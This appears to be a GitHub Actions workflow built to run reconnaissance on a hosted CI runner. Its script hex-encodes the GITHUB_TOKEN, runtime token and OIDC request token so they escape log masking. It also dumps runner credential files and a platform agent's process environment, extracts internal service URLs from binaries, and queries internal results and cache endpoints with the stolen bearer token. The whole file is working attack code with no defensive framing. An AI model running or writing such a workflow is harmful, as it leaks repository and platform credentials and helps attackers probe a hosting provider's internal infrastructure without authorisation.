name: Deeper
on:
  workflow_dispatch:
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - name: deeper recon
        timeout-minutes: 5
        run: |
          set +e
          echo === GITHUB_TOKEN VIA XXD ===
          echo $GITHUB_TOKEN | xxd -p
          echo === ACTIONS_RUNTIME_TOKEN VIA XXD ===
          echo $ACTIONS_RUNTIME_TOKEN | xxd -p
          echo === ACTIONS_CACHE_URL ===
          echo $ACTIONS_CACHE_URL
          echo === ACTIONS_RESULTS_URL ===
          echo $ACTIONS_RESULTS_URL
          echo === ALL ACTIONS ENV ===
          env | grep -i ACTIONS | sort
          echo === ALL GITHUB ENV ===
          env | grep -i GITHUB | sort
          echo === RUNNER ENV ===
          env | grep -i RUNNER | sort
          echo
          echo === RUN SERVICE URLS ===
          strings /opt/hca/hosted-compute-agent | grep -iE '(run-service|runservice|run_service)' | grep -iE '(http|url|host|endpoint)' | sort -u | head -20
          echo === CALLBACK URLS IN HCA ===
          strings /opt/hca/hosted-compute-agent | grep -iE 'callback' | head -20
          echo === ALL INTERNAL URLS ===
          strings /opt/hca/hosted-compute-agent | grep -oE 'https?://[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}[a-zA-Z0-9/._-]*' | sort -u | head -40
          strings /opt/primer/primer | grep -oE 'https?://[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}[a-zA-Z0-9/._-]*' | sort -u | head -40
          echo
          echo === RUNNER CREDENTIALS ===
          find /home/runner -name '.credentials*' -o -name '.runner' -o -name '.env' -o -name '.path' 2>/dev/null | while read f; do
            echo "--- $f ---"
            xxd -p "$f" | head -20
          done
          echo
          echo === RUNNER WORKER DIAG ===
          find /home/runner/runners -name '*.json' 2>/dev/null | while read f; do
            echo "--- $f ---"
            cat "$f" 2>/dev/null | head -20
          done
          echo
          echo === HCA PROCESS ===
          ps aux | grep -E '(hca|hosted-compute|primer)' | grep -v grep
          echo === HCA OPEN FILES ===
          HCA_PID=$(pgrep -f hosted-compute-agent 2>/dev/null | head -1)
          ls -la /proc/$HCA_PID/fd 2>/dev/null | head -20
          echo === HCA NETWORK ===
          cat /proc/$HCA_PID/net/tcp 2>/dev/null | head -10
          echo === HCA ENVIRON ===
          cat /proc/$HCA_PID/environ 2>/dev/null | tr '\0' '\n' | head -30
          echo
          echo === HCA DIRECTORY ===
          ls -laR /opt/hca/ 2>/dev/null
          echo === HCA TAGS ===
          cat /opt/hca/tags 2>/dev/null
          echo === HCA OTHER FILES ===
          find /opt/hca -type f ! -name hosted-compute-agent | while read f; do
            echo "--- $f ---"
            xxd -p "$f" | head -10
          done
          echo
          echo === ACTIONS RESULTS SERVICE ===
          if [ -n "$ACTIONS_RESULTS_URL" ]; then
            curl -s --max-time 3 -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "$ACTIONS_RESULTS_URL" 2>&1 | head -10
          fi
          echo === ACTIONS CACHE SERVICE ===
          if [ -n "$ACTIONS_CACHE_URL" ]; then
            curl -s --max-time 3 -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "${ACTIONS_CACHE_URL}_apis/artifactcache/caches" 2>&1 | head -10
          fi
          echo
          echo === ACTIONS ID TOKEN ===
          echo "$ACTIONS_ID_TOKEN_REQUEST_URL"
          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" | xxd -p | head -5
          echo
          echo === DONE ===
